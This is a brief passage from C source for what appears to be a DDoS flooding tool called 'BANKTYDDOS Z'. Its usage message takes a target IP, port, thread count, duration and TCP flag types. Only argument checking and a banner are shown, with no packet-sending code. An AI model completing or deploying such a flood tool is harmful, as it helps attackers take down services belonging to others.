...
{
	if(argc < 7){
	fprintf(stderr, "BANKTYDDOS Z!\n");
	fprintf(stdout, "BANKTYDDOS Z: %s <IP> <PORT> <THREADS> <-1> <TIME> <ack,syn,psh,fin,rst,urg,ptr,res2,seq>\n", argv[0]);
	exit(-1);
	}
	fprintf(stdout, "BANKTYDDOS Z...\n");
